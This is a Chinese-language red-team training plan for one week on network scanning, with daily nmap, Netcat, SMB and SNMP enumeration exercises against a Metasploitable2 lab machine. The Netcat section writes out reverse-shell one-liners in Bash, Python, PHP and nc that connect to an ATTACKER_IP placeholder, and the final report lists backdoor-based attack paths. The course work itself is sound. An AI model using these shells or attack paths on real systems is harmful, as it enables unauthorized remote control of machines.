@@ -1,0 +1,646 @@
+================================================================================
+第7周：网络扫描 (扫描期)
+================================================================================
+
+【本周围绕的核心渗透案例阶段】
+阶段二：扫描与枚举 (Scanning & Enumeration)
+完成信息侦察后，红队队员进入扫描阶段——对发现的IP和子域名进行系统性的端口扫描、
+服务识别和漏洞枚举。完整学习手册经典案例中的操作5-7属于本阶段：masscan高速扫描
+发现开放端口 → nmap深度服务版本和OS检测 → Netcat多用途交互获取Banner。
+引用：红队队员完整学习手册 → 三、经典渗透案例 → 阶段二: 扫描与枚举
+"操作5: masscan高速扫描发现开放端口 → 
+ 操作6: nmap详细服务扫描(发现Apache 2.4.49路径穿越漏洞!) → 
+ 操作7: amap Banner抓取确认服务版本"
+
+【本周学习目标】
+1. 掌握nmap主机发现的各种技术 (Ping扫描/ARP扫描/TCP SYN扫描/TCP ACK扫描)
+2. 精通nmap端口扫描技术 (SYN扫描/全连接扫描/UDP扫描/NULL/FIN/Xmas扫描)
+3. 熟练使用nmap的服务版本检测(-sV)和操作系统检测(-O)
+4. 掌握NSE脚本引擎的使用 (漏洞扫描/暴力破解/信息收集脚本)
+5. 全面掌握Netcat (端口扫描/文件传输/反弹Shell/后门/代理)
+6. 学会SMB和SNMP服务的枚举技术
+7. 对Metasploitable2完成完整的网络扫描和枚举
+
+【本周知识清单】
+• 端口扫描的三种响应：SYN-ACK(端口开放)、RST(端口关闭)、无响应(被防火墙过滤)
+• nmap主机发现技术：-sn(Ping扫描)/-PS(TCP SYN Ping)/-PA(TCP ACK Ping)/-PU(UDP Ping)
+• nmap端口扫描技术对比：-sS(SYN半开扫描-默认)/-sT(全连接)/-sU(UDP)/-sN(NULL)/-sF(FIN)/-sX(Xmas)
+• SYN半开扫描 vs 全连接扫描的区别（前者不完成三次握手，更隐蔽）
+• UDP扫描的特点和挑战（无连接，响应不明确）
+• nmap -sV服务版本检测的工作原理（Banner抓取+行为分析+特征匹配）
+• nmap -O操作系统检测的指纹识别技术（TCP/IP协议栈特征匹配）
+• NSE脚本引擎：--script=vuln检测漏洞/--script=brute暴力破解/--script=discovery信息发现
+• Netcat(nc)的多模式：客户端模式(nc host port)、监听模式(nc -lvp port)、代理模式
+• SMB枚举：enum4linux工具获取Windows共享/用户/策略信息
+• SNMP枚举：snmpwalk通过SNMP协议获取设备详细信息(使用community string如"public")
+
+【本周工具清单】
+• nmap (网络扫描器之王)
+• netcat / nc (TCP/IP瑞士军刀)
+• masscan (高速扫描器 - 下周深入学习)
+• enum4linux (SMB枚举)
+• smbclient (SMB客户端)
+• snmpwalk / onesixtyone (SNMP枚举)
+• Metasploitable2 (实验目标)
+
+================================================================================
+周一：nmap主机发现与端口扫描
+================================================================================
+
+📚 第1小时 | 理论学习 (19:00 - 20:00)
+  学习内容：nmap完整功能概览——主机发现(判断哪些IP在线)、端口扫描(判断哪些端口开放)、
+  服务版本检测(识别端口上运行什么服务)、操作系统检测(识别目标操作系统)、
+  NSE脚本引擎(扩展功能)。主机发现技术：-sn(Ping扫描，发送ICMP Echo+TCP SYN
+  到443+TCP ACK到80+ICMP Timestamp)，-PE(纯ICMP Echo)，-PS(发送SYN到指定端口
+  判断存活，比ICMP更有效因为很多防火墙只阻拦ICMP)，-PA(TCP ACK扫描)。
+  端口扫描核心：-sS(SYN半开扫描——发送SYN，收到SYN-ACK表示开放，收到RST表示关闭，
+  然后立即发RST断开，不完成三次握手所以不在应用层日志留痕)。端口状态六种：
+  open(开放)、closed(关闭)、filtered(被过滤)、unfiltered(未被过滤但无法判断)、
+  open|filtered(开放或被过滤，UDP扫描中常见)、closed|filtered(关闭或被过滤)。
+  参考文件：/home/a/成长为一个红队/archstrike-base教学/03-网络扫描与枚举技术.txt（阅读第一部分: nmap完整教程 1.1-1.2）
+
+💻 第2小时 | 动手实践 (20:00 - 21:00)
+  练习内容：使用nmap对Metasploitable2进行各种类型的主机发现和端口扫描。
+  理解不同扫描技术的结果差异和执行速度差异。
+  参考文件：/home/a/成长为一个红队/archstrike-base教学/03-网络扫描与枚举技术.txt
+
+  操作步骤：
+    Step 1: nmap主机发现练习
+      # 准备工作：确认靶机IP
+      # (假设Metasploitable2 IP为192.168.56.102)
+      TARGET="192.168.56.102"
+
+      # Ping扫描子网存活主机
+      nmap -sn 192.168.56.0/24 2>/dev/null
+
+      # 各种Ping扫描技术对比
+      nmap -PE $TARGET 2>/dev/null      # 纯ICMP Echo
+      nmap -PS22,80,443 $TARGET 2>/dev/null  # TCP SYN Ping
+      nmap -PA80,443 $TARGET 2>/dev/null     # TCP ACK Ping
+      nmap -PU53,161 $TARGET 2>/dev/null     # UDP Ping
+
+      # 无Ping扫描（跳过主机发现，直接端口扫描）
+      nmap -Pn $TARGET 2>/dev/null      # 适用于防火墙阻止Ping的目标
+
+    Step 2: 端口扫描技术对比
+      # SYN半开扫描（默认，需要root权限）
+      sudo nmap -sS $TARGET 2>/dev/null | tee ~/training/week7/nmap_syn.txt
+
+      # 全连接扫描（不需要root，但速度慢，会留下连接日志）
+      nmap -sT $TARGET 2>/dev/null | tee ~/training/week7/nmap_connect.txt
+
+      # UDP扫描（慢，但能发现UDP服务如DNS/SNMP）
+      sudo nmap -sU --top-ports 20 $TARGET 2>/dev/null | tee ~/training/week7/nmap_udp.txt
+
+      # 快速扫描（只扫描前100个常用端口）
+      nmap -F $TARGET 2>/dev/null | tee ~/training/week7/nmap_fast.txt
+
+      # 全端口扫描（1-65535）
+      nmap -p- $TARGET 2>/dev/null | tee ~/training/week7/nmap_full.txt
+
+    Step 3: 端口扫描高级选项
+      # 指定端口范围
+      nmap -p 1-1000 $TARGET 2>/dev/null
+      nmap -p 22,80,443,3306,8080 $TARGET 2>/dev/null
+
+      # 按服务名扫描
+      nmap -p http,https,ssh,ftp,mysql $TARGET 2>/dev/null
+
+      # 扫描速度控制（T0最慢最隐蔽 → T5最快最容易被发现）
+      echo "对比扫描速度:"
+      for timing in T0 T1 T2 T3 T4 T5; do
+          echo -n "[$timing] "
+          time nmap -$timing -p 1-100 $TARGET 2>/dev/null | grep "Nmap done" | head -1
+      done
+
+    Step 4: 扫描结果解读
+      cat > ~/training/week7/nmap_analysis.txt << 'EOF'
+      Nmap扫描结果解读
+      =========================================
+      端口状态:
+        open           → 端口正在监听，TCP连接可建立
+        closed         → 端口可达但无服务监听，收到RST
+        filtered       → 被防火墙/IPS过滤，无法判断状态
+        open|filtered   → UDP扫描中常见，无响应
+      
+      Nmap扫描时间分析:
+        -sS (SYN扫描): 最快，需要root
+        -sT (全连接):  中等，不需要root
+        -sU (UDP):     最慢，往往需要数小时扫描全部端口
+        -sS + -sV:     较慢，因为需要与每个端口交互获取版本
+      EOF
+      cat ~/training/week7/nmap_analysis.txt
+
+📝 第3小时 | 复盘总结 (21:00 - 22:00)
+  - 今日收获：掌握了nmap主机发现和端口扫描的各种技术，理解了不同扫描方法的速度和隐蔽性差异
+  - 遇到问题：(记录UDP扫描速度慢、某些扫描需要root权限等)
+  - 明日计划：学习nmap服务和OS检测+NSE脚本
+
+================================================================================
+周二：nmap服务和OS检测 + NSE脚本
+================================================================================
+
+📚 第1小时 | 理论学习 (19:00 - 20:00)
+  学习内容：nmap服务版本检测(-sV)的工作原理——它不是简单根据端口号判断服务（
+  端口号不可信！管理员可以把SSH放在64221端口），而是发送一系列精心构造的探测
+  包（HTTP GET请求、SSL ClientHello、SSH版本字符串等），通过分析响应内容的
+  Banner和特征签名来确定真实服务名称和版本。操作系统检测(-O)是TCP/IP协议栈
+  指纹识别——不同操作系统在实现TCP/IP协议时有微妙差异（如初始TTL值、TCP窗口
+  大小、TCP选项顺序等），nmap有数千个操作系统的指纹数据库用于匹配。
+  NSE脚本引擎是nmap可扩展性的核心，分为14个类别：auth(认证)、broadcast(广播)、
+  brute(爆破)、default(默认)、discovery(发现)、dos(拒绝服务)、exploit(利用)、
+  external(外部)、fuzzer(模糊)、intrusive(侵入)、malware(恶意软件)、
+  safe(安全)、version(版本)、vuln(漏洞)。常用NSE脚本：vuln检测漏洞、
+  http-enum枚举Web路径、smb-os-discovery发现Windows信息。
+  参考文件：/home/a/成长为一个红队/archstrike-base教学/03-网络扫描与枚举技术.txt（阅读nmap -sV和-O和NSE部分: 1.2-1.4）
+
+💻 第2小时 | 动手实践 (20:00 - 21:00)
+  练习内容：对Metasploitable2执行完整的服务和OS检测，练习NSE脚本的各种分类。
+  参考文件：/home/a/成长为一个红队/archstrike-base教学/03-网络扫描与枚举技术.txt
+
+  操作步骤：
+    Step 1: 服务版本检测
+      TARGET="192.168.56.102"
+      mkdir -p ~/training/week7/nmap_scans
+
+      # 基础服务版本检测
+      nmap -sV $TARGET 2>/dev/null | tee ~/training/week7/nmap_scans/sV_basic.txt
+
+      # 激进服务检测（尝试更多探测，可能识别出更多服务）
+      nmap -sV --version-intensity 9 $TARGET 2>/dev/null | tee ~/training/week7/nmap_scans/sV_aggressive.txt
+
+      # 服务版本检测 + 全端口
+      nmap -sV -p- $TARGET 2>/dev/null | tee ~/training/week7/nmap_scans/sV_full.txt
+
+      # 服务版本+脚本+OS检测（组合扫描）
+      nmap -sS -sV -sC -O $TARGET 2>/dev/null | tee ~/training/week7/nmap_scans/all_in_one.txt
+      # -sV: 服务版本, -sC: 默认脚本, -O: OS检测
+
+    Step 2: 操作系统检测(-O)
+      # 基础OS检测
+      sudo nmap -O $TARGET 2>/dev/null | tee ~/training/week7/nmap_scans/OS_detect.txt
+
+      # 激进OS检测（更多探测，成功率更高）
+      sudo nmap -O --osscan-guess $TARGET 2>/dev/null | tee ~/training/week7/nmap_scans/OS_guess.txt
+
+      # OS检测限制扫描（速度更快）
+      sudo nmap -O --osscan-limit $TARGET 2>/dev/null
+
+    Step 3: NSE脚本引擎练习
+      # 查看可用的脚本分类
+      ls /usr/share/nmap/scripts/ | head -20
+
+      # 查看脚本总数
+      echo "nmap NSE脚本总数: $(ls /usr/share/nmap/scripts/*.nse 2>/dev/null | wc -l)"
+
+      # 漏洞扫描脚本（红队核心）
+      nmap --script=vuln $TARGET 2>/dev/null | tee ~/training/week7/nmap_scans/NSE_vuln.txt
+
+      # 默认安全脚本
+      nmap -sC $TARGET 2>/dev/null | tee ~/training/week7/nmap_scans/NSE_default.txt
+
+      # HTTP相关脚本
+      nmap --script=http-enum,http-headers,http-methods,http-title \
+        -p 80,443,8080,8180 $TARGET 2>/dev/null | tee ~/training/week7/nmap_scans/NSE_http.txt
+
+      # SMB枚举脚本
+      nmap --script=smb-os-discovery,smb-enum-shares,smb-enum-users \
+        -p 139,445 $TARGET 2>/dev/null | tee ~/training/week7/nmap_scans/NSE_smb.txt
+
+      # FTP脚本
+      nmap --script=ftp-anon,ftp-bounce,ftp-proftpd-backdoor \
+        -p 21 $TARGET 2>/dev/null | tee ~/training/week7/nmap_scans/NSE_ftp.txt
+
+      # SSH脚本
+      nmap --script=ssh-hostkey,ssh-auth-methods \
+        -p 22 $TARGET 2>/dev/null | tee ~/training/week7/nmap_scans/NSE_ssh.txt
+
+    Step 4: 综合扫描命令（渗透测试标准操作）
+      # 一次命令完成：端口扫描+服务版本+默认脚本+OS检测
+      sudo nmap -sS -sV -sC -O -p- --reason \
+        -oA ~/training/week7/nmap_scans/metasploitable2_full \
+        $TARGET 2>/dev/null
+
+      # -oA: 输出三种格式(.nmap/.xml/.gnmap)
+      ls -la ~/training/week7/nmap_scans/metasploitable2_full.*
+
+      # 生成HTML报告
+      xsltproc ~/training/week7/nmap_scans/metasploitable2_full.xml \
+        -o ~/training/week7/nmap_scans/report.html 2>/dev/null || echo "xsltproc未安装"
+
+    Step 5: 关键渗透发现分析
+      cat > ~/training/week7/nmap_findings.txt << 'EOF'
+      Metasploitable2 Nmap扫描关键发现
+      =========================================
+      漏洞服务:
+        21/tcp - vsftpd 2.3.4 (后门版本! CVE-2011-2523)
+        23/tcp - telnet (明文协议，可暴力破解)
+        25/tcp - Postfix smtpd (可能用户枚举)
+        80/tcp - Apache 2.2.8 (2008年版, 大量已知漏洞)
+        445/tcp - Samba 3.x (可进行SMB枚举)
+        1524/tcp - ingreslock 后门(root shell!)
+        2121/tcp - ProFTPD 1.3.1 (已知漏洞)
+        3306/tcp - MySQL 5.0.51a (弱密码可能)
+        5432/tcp - PostgreSQL 8.3.1 (老版本)
+        6667/tcp - UnrealIRCd (后门版本!)
+        8180/tcp - Apache Tomcat/Coyote JSP 1.1
+      EOF
+      cat ~/training/week7/nmap_findings.txt
+
+📝 第3小时 | 复盘总结 (21:00 - 22:00)
+  - 今日收获：掌握了nmap服务版本和OS检测技术，学会了NSE脚本的种类和用法，发现了Metasploitable2的大量漏洞
+  - 遇到问题：(记录NSE脚本报错、OS检测不确定等)
+  - 明日计划：全面掌握Netcat
+
+================================================================================
+周三：Netcat全面掌握（瑞士军刀）
+================================================================================
+
+📚 第1小时 | 理论学习 (19:00 - 20:00)
+  学习内容：Netcat(nc)被称为"TCP/IP瑞士军刀"，是最多功能、最灵活的网络工具之一。
+  核心功能：1.端口扫描(nc -zv host port_range)、2.Banner抓取(nc host port)、
+  3.TCP/UDP监听器(nc -lvp port)、4.文件传输(接收端nc -lvp port > file、
+  发送端nc host port < file)、5.反弹Shell(目标:nc -e /bin/bash host port 或
+  使用管道实现无-e版本)、6.简易聊天/隧道。Netcat反弹Shell是红队最核心的技能
+  之一：在目标机器上执行 nc attacker_ip 4444 -e /bin/bash，攻击端监听
+  nc -lvp 4444，目标机器上的Shell就被"反弹"到了攻击端。理解无-e版本的反弹
+  Shell实现（使用FIFO命名管道: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i
+  2>&1|nc attacker port >/tmp/f）。Netcat与传统Unix管道的配合：
+  nc + 输入/输出重定向的强大组合。
+  参考文件：/home/a/成长为一个红队/archstrike-base教学/03-网络扫描与枚举技术.txt（阅读netcat部分: 第2章）
+
+💻 第2小时 | 动手实践 (20:00 - 21:00)
+  练习内容：全面练习Netcat的各种功能——端口扫描、Banner抓取、文件传输、
+  聊天、监听、反弹Shell。使用两个终端模拟攻击端和目标端。
+  参考文件：/home/a/成长为一个红队/archstrike-base教学/03-网络扫描与枚举技术.txt
+
+  操作步骤：
+    Step 1: Netcat端口扫描
+      TARGET="192.168.56.102"
+      # 扫描单个端口
+      nc -zv $TARGET 80
+
+      # 扫描端口范围
+      nc -zv $TARGET 1-100 2>&1 | grep succeeded
+
+      # 扫描常用端口
+      for port in 21 22 23 25 53 80 110 111 139 143 443 445 993 995 3306 5432 5900 6667 8080 8180; do
+          nc -zv -w 1 $TARGET $port 2>&1
+      done
+
+    Step 2: Netcat Banner抓取
+      # HTTP Banner
+      echo -e "HEAD / HTTP/1.0\r\n\r\n" | nc -w 2 $TARGET 80
+
+      # SSH Banner
+      echo "" | nc -w 2 $TARGET 22
+
+      # SMTP Banner
+      echo "" | nc -w 2 $TARGET 25
+
+      # FTP Banner
+      echo "" | nc -w 2 $TARGET 21
+
+      # MySQL Banner
+      echo "" | nc -w 2 $TARGET 3306
+
+    Step 3: Netcat简易聊天（双终端实验）
+      # 终端1: 启动监听
+      # nc -lvp 8888
+      # 终端2: 连接到监听端
+      # nc localhost 8888
+      # 在两个终端中互相打字，观察实时双向通信
+
+    Step 4: Netcat文件传输
+      # 创建测试文件
+      dd if=/dev/urandom of=/tmp/testfile.bin bs=1M count=10 2>/dev/null
+
+      # 接收端（先在终端1中启动）
+      nc -lvp 9999 > /tmp/received_file.bin &
+
+      # 发送端（终端2中执行）
+      sleep 1
+      nc -w 2 localhost 9999 < /tmp/testfile.bin
+
+      # 验证文件完整性
+      md5sum /tmp/testfile.bin /tmp/received_file.bin
+
+    Step 5: Netcat反弹Shell（核心技能！）
+      # 警告：以下操作仅在授权环境中练习！
+      
+      # 场景1: 有 -e 选项的简单反弹Shell
+      # 攻击端（终端1）:
+      nc -lvp 4444 &
+      
+      # 目标端（终端2 - 在Metasploitable2中执行）:
+      # nc 攻击机IP 4444 -e /bin/bash
+      # 这里由于在同一机器练习，使用本地：
+      # nc localhost 4444 -e /bin/bash  (如果nc支持-e选项)
+
+      echo "=== Netcat反弹Shell变体 ===" > ~/training/week7/netcat_shells.txt
+      
+      # 变体1: Bash反弹Shell（无nc -e选项）
+      echo "Bash反弹Shell:" >> ~/training/week7/netcat_shells.txt
+      echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> ~/training/week7/netcat_shells.txt
+
+      # 变体2: Python反弹Shell
+      echo "Python反弹Shell:" >> ~/training/week7/netcat_shells.txt
+      echo 'python3 -c '"'"'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'"'" >> ~/training/week7/netcat_shells.txt
+
+      # 变体3: PHP反弹Shell
+      echo "PHP反弹Shell:" >> ~/training/week7/netcat_shells.txt
+      echo 'php -r '"'"'$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'"'" >> ~/training/week7/netcat_shells.txt
+
+      cat ~/training/week7/netcat_shells.txt
+
+    Step 6: Netcat端口转发/代理
+      # 简易TCP代理（通过命名管道FIFO）
+      # 场景：通过跳板机A访问内网目标B
+      # 在跳板机上:
+      mkfifo /tmp/backpipe
+      # nc -lvp 8080 < /tmp/backpipe | nc 内网目标 80 > /tmp/backpipe
+
+📝 第3小时 | 复盘总结 (21:00 - 22:00)
+  - 今日收获：全面掌握了Netcat的所有核心功能，特别是反弹Shell技术，理解了多种反弹Shell的变体
+  - 遇到问题：(记录nc -e选项不可用、反弹Shell测试失败、防火墙阻拦等)
+  - 明日计划：学习SMB和SNMP枚举技术
+
+================================================================================
+周四：SMB与SNMP枚举
+================================================================================
+
+📚 第1小时 | 理论学习 (19:00 - 20:00)
+  学习内容：SMB(Server Message Block)是Windows网络文件/打印共享的核心协议，
+  运行在139(NETBIOS over TCP)和445(直接SMB over TCP)端口上。在渗透测试中，
+  SMB枚举是Windows环境渗透的关键入口——通过SMB可以获取：共享列表(windows共享/
+  用户家目录/打印机)、用户列表、组信息、密码策略、操作系统版本。
+  SMB枚举的常见漏洞：空会话(null session)允许未认证用户通过IPC$共享查询
+  大量系统信息、SMBv1中的EternalBlue(永恒之蓝,CVE-2017-0144)漏洞。
+  SNMP(Simple Network Management Protocol)运行在UDP 161端口上，用于网络设备
+  管理。SNMP枚举通过community string(认证字符串，默认public/private)来访问
+  设备的MIB(管理信息库)，获取：网络接口、路由表、运行进程、硬件型号等敏感信息。
+  参考文件：/home/a/成长为一个红队/archstrike-base教学/03-网络扫描与枚举技术.txt（阅读SMB和SNMP枚举部分: 第3-4章）
+
+💻 第2小时 | 动手实践 (20:00 - 21:00)
+  练习内容：使用enum4linux/smbclient对Metasploitable2的SMB服务进行枚举，
+  使用snmpwalk/onesixtyone对SNMP服务进行枚举。
+  参考文件：/home/a/成长为一个红队/archstrike-base教学/03-网络扫描与枚举技术.txt
+
+  操作步骤：
+    Step 1: SMB枚举 - enum4linux
+      TARGET="192.168.56.102"
+      mkdir -p ~/training/week7/enum_results
+
+      # enum4linux完整枚举
+      enum4linux -a $TARGET 2>/dev/null | tee ~/training/week7/enum_results/enum4linux_full.txt
+
+      # 单独功能:
+      # -U: 用户列表
+      enum4linux -U $TARGET 2>/dev/null | tee ~/training/week7/enum_results/smb_users.txt
+
+      # -S: 共享列表
+      enum4linux -S $TARGET 2>/dev/null | tee ~/training/week7/enum_results/smb_shares.txt
+
+      # -P: 密码策略
+      enum4linux -P $TARGET 2>/dev/null | tee ~/training/week7/enum_results/smb_passpolicy.txt
+
+      # -G: 组列表
+      enum4linux -G $TARGET 2>/dev/null | tee ~/training/week7/enum_results/smb_groups.txt
+
+      # -o: OS信息
+      enum4linux -o $TARGET 2>/dev/null | tee ~/training/week7/enum_results/smb_osinfo.txt
+
+    Step 2: smbclient直接连接共享
+      # 列出共享
+      smbclient -L //$TARGET -N 2>/dev/null
+      # -N: 不提示密码（尝试空会话/匿名登录）
+
+      # 连接到共享
+      smbclient //$TARGET/tmp -N 2>/dev/null
+      # 在smb: \> 提示符下操作：
+      #   ls     (列出文件)
+      #   get    (下载文件)
+      #   put    (上传文件 - 测试写权限)
+      #   exit   (退出)
+
+      # 尝试以特定用户连接
+      smbclient //$TARGET/homes -U msfadmin%msfadmin 2>/dev/null
+
+    Step 3: 检查SMB漏洞（永恒之蓝）
+      # nmap NSE脚本检测SMBv1漏洞
+      nmap --script=smb-vuln* -p 445 $TARGET 2>/dev/null | tee ~/training/week7/enum_results/smb_vuln.txt
+
+      # 检测空会话（Null Session）
+      nmap --script=smb-enum-sessions -p 445 $TARGET 2>/dev/null
+
+    Step 4: SNMP枚举
+      # onesixtyone - SNMP community string爆破
+      echo public > /tmp/community.txt
+      echo private >> /tmp/community.txt
+      echo manager >> /tmp/community.txt
+      onesixtyone -c /tmp/community.txt $TARGET 2>/dev/null | tee ~/training/week7/enum_results/snmp_onesixtyone.txt
+
+      # snmpwalk枚举
+      # 如果发现community string为public:
+      snmpwalk -v 2c -c public $TARGET 2>/dev/null | head -50 | tee ~/training/week7/enum_results/snmpwalk_basic.txt
+
+      # 枚举特定MIB树
+      snmpwalk -v 2c -c public $TARGET system 2>/dev/null | tee ~/training/week7/enum_results/snmp_system.txt
+
+      # 枚举运行进程
+      snmpwalk -v 2c -c public $TARGET 1.3.6.1.2.1.25.4.2.1.2 2>/dev/null | tee ~/training/week7/enum_results/snmp_processes.txt
+
+      # 枚举网络接口
+      snmpwalk -v 2c -c public $TARGET interfaces 2>/dev/null | tee ~/training/week7/enum_results/snmp_interfaces.txt
+
+      # 枚举用户账户
+      snmpwalk -v 2c -c public $TARGET 1.3.6.1.4.1.77.1.2.25 2>/dev/null | tee ~/training/week7/enum_results/snmp_users.txt
+
+    Step 5: 枚举结果分析总结
+      cat > ~/training/week7/enum_results/analysis.txt << 'EOF'
+      SMB/SNMP枚举结果分析
+      =========================================
+      SMB枚举发现的价值信息:
+        - 共享列表 → 哪些目录可匿名访问
+        - 用户列表 → 为密码喷洒/暴力破解提供用户名
+        - 密码策略 → 最小长度/复杂度要求/锁定策略
+        - SID列表 → Windows/域信息
+        - OS版本 → 匹配已知漏洞
+
+      SNMP枚举发现的价值信息:
+        - 系统信息 → 主机名/描述/联系人
+        - 运行进程 → 反病毒软件/正在运行的服务
+        - 网络接口 → IP/路由表/ARP表
+        - 用户账户 → 本地/域用户列表
+        - 安装软件 → 版本信息 → 已知漏洞匹配
+      EOF
+      cat ~/training/week7/enum_results/analysis.txt
+
+📝 第3小时 | 复盘总结 (21:00 - 22:00)
+  - 今日收获：掌握了SMB和SNMP的服务枚举技术，理解了这些协议在渗透测试中的信息收集价值
+  - 遇到问题：(记录SMB空会话被限制、SNMP community string未知等)
+  - 明日计划：对Metasploitable2做完整综合扫描
+
+================================================================================
+周五：对Metasploitable2做完整扫描
+================================================================================
+
+📚 第1小时 | 理论学习 (19:00 - 20:00)
+  学习内容：整合本周所有扫描技术，设计完整的扫描工作流：
+  第一阶段-存活检测(Ping扫描+ARP扫描) → 第二阶段-全端口快速扫描(masscan/nmap -p-快速模式) →
+  第三阶段-服务深入扫描(nmap -sV -sC -O对开放端口深度扫描) → 第四阶段-NSE漏洞验证
+  (--script=vuln针对性验证) → 第五阶段-手动服务枚举(Banner/Netcat/SMB/SNMP) →
+  第六阶段-结果汇总和攻击路径分析。理解扫描的优先级思维：不是所有发现都同等重要，
+  应优先关注已知漏洞服务(vsftpd 2.3.4后门/UnrealIRCd后门/ingreslock后门)、
+  弱口令入口(Tomcat/MySQL/SSH)、可匿名访问的服务(SMB/FTP)。
+  参考文件：/home/a/成长为一个红队/archstrike-base教学/03-网络扫描与枚举技术.txt（复习全部）
+
+💻 第2小时 | 动手实践 (20:00 - 21:00)
+  练习内容：对Metasploitable2执行分阶段完整扫描，形成一份全面的扫描报告。
+  参考文件：/home/a/成长为一个红队/archstrike-base教学/03-网络扫描与枚举技术.txt
+
+  操作步骤：
+    Step 1: 第一阶段 - 存活确认和端口快速扫描
+      TARGET="192.168.56.102"
+      mkdir -p ~/training/week7/final_scan
+
+      # 存活确认
+      ping -c 3 $TARGET | tee ~/training/week7/final_scan/01_ping.txt
+
+      # ARP确认（局域网内最可靠）
+      arp -a | grep $TARGET | tee ~/training/week7/final_scan/02_arp.txt
+
+      # 全端口快速扫描（SYN扫描，T4速度）
+      sudo nmap -sS -p- -T4 --min-rate 1000 $TARGET \
+        2>/dev/null | tee ~/training/week7/final_scan/03_all_ports.txt
+
+    Step 2: 第二阶段 - 开放端口深度扫描
+      # 提取开放端口列表
+      cat ~/training/week7/final_scan/03_all_ports.txt | grep "^[0-9]" | \
+        awk -F/ '{print $1}' | paste -sd, > ~/training/week7/final_scan/open_ports.txt
+      OPEN_PORTS=$(cat ~/training/week7/final_scan/open_ports.txt)
+      echo "开放端口: $OPEN_PORTS"
+
+      # 对开放端口做深度服务+脚本+OS扫描
+      sudo nmap -sS -sV -sC -O -p $OPEN_PORTS --script-timeout 30s \
+        -oA ~/training/week7/final_scan/04_deep_scan $TARGET 2>/dev/null
+
+      cat ~/training/week7/final_scan/04_deep_scan.nmap
+
+    Step 3: 第三阶段 - NSE漏洞脚本专项扫描
+      # 漏洞检测
+      nmap --script=vuln -p $OPEN_PORTS $TARGET 2>/dev/null | \
+        tee ~/training/week7/final_scan/05_vuln_scan.txt
+
+      # 特定高危漏洞检测
+      nmap --script=ftp-vsftpd-backdoor,ftp-proftpd-backdoor \
+        -p 21,2121 $TARGET 2>/dev/null | tee ~/training/week7/final_scan/05_ftp_vuln.txt
+
+      nmap --script=smb-vuln-ms17-010 -p 445 $TARGET 2>/dev/null | \
+        tee ~/training/week7/final_scan/05_smb_vuln.txt
+
+    Step 4: 第四阶段 - 手动服务交互验证
+      echo "=== 手动服务验证 ===" > ~/training/week7/final_scan/06_manual_check.txt
+
+      # 检查FTP匿名登录
+      echo "FTP匿名登录测试:" >> ~/training/week7/final_scan/06_manual_check.txt
+      echo -e "USER anonymous\nPASS anonymous\nQUIT" | nc -w 3 $TARGET 21 >> ~/training/week7/final_scan/06_manual_check.txt 2>&1
+
+      # 检查vsftpd后门特征
+      echo "vsftpd版本检查:" >> ~/training/week7/final_scan/06_manual_check.txt
+      echo "" | nc -w 2 $TARGET 21 >> ~/training/week7/final_scan/06_manual_check.txt 2>&1
+
+      # 检查ingreslock后门(root shell)
+      echo "ingreslock后门检查 (端口1524):" >> ~/training/week7/final_scan/06_manual_check.txt
+      timeout 3 nc $TARGET 1524 2>/dev/null && echo "[-] 后门存在! 1524端口开放!" >> ~/training/week7/final_scan/06_manual_check.txt
+
+    Step 5: 综合扫描报告生成
+      cat > ~/training/week7/final_scan/complete_report.txt << 'EOF'
+      ==============================================
+      Metasploitable2 完整扫描报告
+      ==============================================
+      目标IP:
+      扫描时间:
+      
+      === 一、开放端口和服务 ===
+      (从04_deep_scan.nmap复制开放端口列表)
+
+      === 二、关键漏洞发现 ===
+      🔴 高危:
+        - 1524/tcp ingreslock后门: root shell直接可用
+        - 21/tcp vsftpd 2.3.4 后门: 笑脸漏洞6200端口
+        - 6667/tcp UnrealIRCd 后门: 通过IRC触发命令执行
+
+      🟡 中危:
+        - 80/tcp Apache 2.2.8: 老版本, 多个已知漏洞
+        - 8180/tcp Tomcat: 默认密码tomcat/tomcat → WAR部署RCE
+        - 22/tcp SSH: msfadmin弱口令
+        - 3306/tcp MySQL: 可能root空密码
+        - 445/tcp Samba: 可枚举用户和共享
+
+      🟢 低危:
+        - 25/tcp SMTP: 可用于用户枚举
+        - 23/tcp Telnet: 明文登录, 但需要凭据
+
+      === 三、推荐攻击路径 ===
+      路径1 (最快速): nc连接1524端口 → 直接获得root shell
+      路径2 (Web路径): Tomcat弱口令 → 部署WAR shell → 获得tomcat用户 → 本地提权
+      路径3 (经典): vsftpd后门 → 6200端口反弹shell → 获得root权限
+      ==============================================
+      EOF
+      cat ~/training/week7/final_scan/complete_report.txt
+
+📝 第3小时 | 复盘总结 (21:00 - 22:00)
+  - 今日收获：完成了对Metasploitable2的完整分阶段扫描，形成了系统化的扫描方法论
+  - 遇到问题：(记录组合扫描时参数冲突、部分脚本执行超时等)
+  - 明日计划：周六复习日，全面回顾扫描技术
+
+================================================================================
+周六：复习日
+================================================================================
+  上午 (2小时)：回顾本周所有扫描知识点
+    - 重做Metasploitable2的完整四阶段扫描（不要看笔记）
+    - 练习nmap各种扫描技术的组合用法
+    - 默写5种反弹Shell的代码（Bash/Python/PHP/Netcat/Perl）
+    - 整理nmap NSE脚本分类和使用场景表
+
+  下午 (1小时)：在HackTheBox/TryHackMe上做相关挑战
+    - TryHackMe Room: Nmap (完整的nmap教程)
+    - TryHackMe Room: Nmap Live Host Discovery
+    - HackTheBox Starting Point: Dancing (SMB枚举)
+
+  晚间：整理本周笔记
+    - 制作nmap扫描命令速查表
+    - 整理扫描工作流SOP（六阶段方法论）
+    - 归档Metasploitable2完整扫描报告
+
+================================================================================
+周日：休息日
+================================================================================
+  体能训练 | 自由活动 | 补充睡眠
+
+================================================================================
+【本周资源清单】
+================================================================================
+理论知识文件：
+  • /home/a/成长为一个红队/archstrike-base教学/03-网络扫描与枚举技术.txt（全部）
+
+实践教程文件：
+  • /home/a/成长为一个红队/archstrike-base教学/03-网络扫描与枚举技术.txt（全部）
+  • /home/a/成长为一个红队/archstrike-base教学/06-网络嗅探与中间人攻击.txt（netcat部分）
+
+在线练习：
+  • TryHackMe Room: Nmap
+  • TryHackMe Room: Nmap Live Host Discovery
+  • HackTheBox Starting Point: Dancing (SMB枚举)
+  • Metasploitable2虚拟机 (所有扫描练习)
+
